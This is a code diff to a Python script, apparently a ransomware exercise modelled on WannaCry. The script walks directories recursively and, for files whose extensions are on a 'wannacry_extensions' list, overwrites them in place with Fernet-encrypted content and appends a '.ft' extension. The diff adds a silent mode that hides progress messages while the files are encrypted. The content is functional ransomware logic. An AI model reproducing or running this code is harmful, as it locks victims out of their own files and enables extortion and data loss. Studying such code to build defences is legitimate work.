@@ -44,15 +44,15 @@ def add_extension(filepath: str)-> None:
     else:
         os.rename(filepath, filepath + ".ft")
 
-def encrypt_file(key: bytes, filepath: str):
+def encrypt_file(fernet: Fernet, filepath: str, silent: bool)-> None:
     try:
         with open(filepath, "rb") as file:
             file_content = file.read()
     except OSError as error:
         print(error)
         return
-    fernet = Fernet(key)
-    print(f"Encryption of {filepath} ... ", end="")
+    if silent is False:
+        print(f"Encryption of {filepath} ... ", end="")
     encrypted_content = fernet.encrypt(file_content)
     try:
         with open(filepath, "wb") as file:
@@ -60,17 +60,18 @@ def encrypt_file(key: bytes, filepath: str):
     except OSError as error:
         print(error)
         return
-    print("| SUCCESS")
+    if silent is False:
+        print("| SUCCESS")
 
-def encryption(key: bytes, path: str, silent: bool)-> None:
+def encryption(fernet: Fernet, path: str, silent: bool)-> None:
     files = os.listdir(path)
     for filename in files:
         filepath = os.path.join(path, filename)
         file_extension = "." + filepath.split(".")[-1]
         if os.path.isdir(filepath) is True:
-            encryption(key, filepath, silent)
+            encryption(fernet, filepath, silent)
         else:
             if file_extension not in wannacry_extensions:
                 continue
-            encrypt_file(key, filepath)
+            encrypt_file(fernet, filepath, silent)
             add_extension(filepath)
